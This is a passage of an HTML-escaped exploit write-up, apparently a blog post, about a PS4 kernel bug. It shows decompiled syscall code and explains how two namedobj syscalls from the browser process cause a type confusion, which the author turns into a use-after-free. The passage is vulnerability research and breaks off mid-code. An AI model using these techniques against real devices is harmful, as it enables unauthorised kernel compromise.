      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EAGAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;id_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;id_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td_retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we need to find a way to have the kernel access and improperly use an object from our process’ (i.e. the browser process) idt which has a &lt;code&gt;kind&lt;/code&gt; of &lt;code&gt;0x1000&lt;/code&gt; plus any other number of bits set. This was found in the following code:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;19&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;namedobj_dbg_t&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_pad_4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// compiler-inserted alignment&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;namedobj_create_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;namedobj_dbg_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// er13&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide_existing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+20h] [rbp-40h]&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EAGAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;namedobj_dbg_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_rlock_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_TYPE_NAMEDOBJ_DBG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                              &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide_existing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;no_exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;id_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide_existing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// ... unrelated code removed&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;…which is accessible from the &lt;code&gt;mdbg_service&lt;/code&gt; syscall:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;19&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mdbg_service_arg1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sys_mdbg_service&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ebx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r14&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;mdbg_service_arg1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+18h] [rbp-68h]&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;uptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ... unrelated code removed&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1uLL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;namedobj_create_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td_proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sce_idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;cmd_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field_20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// ... unrelated code removed&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Using the combination of these syscalls, we can induce a type confusion. First, calling &lt;code&gt;namedobj_create(name = &quot;haxplz&quot;, kind = 0x1000 | 0x4000, ...)&lt;/code&gt; will cause the kernel to set a pointer of type &lt;code&gt;namedobj_usr_t&lt;/code&gt; into the idt. Then, calling &lt;code&gt;namedobj_create_ex(name = &quot;haxplz&quot;, ...)&lt;/code&gt; will cause the kernel to access the same pointer, but cast it to type &lt;code&gt;namedobj_dbg_t&lt;/code&gt;!&lt;/p&gt;

&lt;p&gt;To an exploiter without ps4 background, it might seem that the easiest way to exploit this bug would be to take advantage of the write off the end of the malloc’d &lt;code&gt;namedobj_usr_t&lt;/code&gt; object. However, this turns out to be impossible (as far as I know) because of a side effect of the ps4 page size being changed to 0x4000 bytes (from the normal of 0x1000). It appears that in order to change the page size globally, the ps4 kernel developers opted to directly change the &lt;a href=&quot;https://github.com/freebsd/freebsd/blob/releng/9.1/sys/amd64/include/param.h#L92&quot;&gt;related macros&lt;/a&gt;. One of the many changes resulting from this is that the smallest actual amount of memory which malloc may give back to a caller becomes &lt;a href=&quot;https://github.com/freebsd/freebsd/blob/releng/9.1/sys/vm/uma.h#L43&quot;&gt;0x40 bytes&lt;/a&gt;. While this also results in tons of memory being completely wasted, it does serve to nullify certain exploitation techniques (likely completely by accident…).&lt;/p&gt;
&lt;h2 id=&quot;uaf-crafting&quot;&gt;UAF Crafting&lt;/h2&gt;
&lt;p&gt;The way chosen to exploit this type confusion was actually to convert it into a use-after-free scenario. This was done with the help of the &lt;code&gt;namedobj_delete&lt;/code&gt; syscall:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;18&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sys_namedobj_delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r15&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;namedobj_usr_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r14&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+8h] [rbp-28h]&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sce_idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
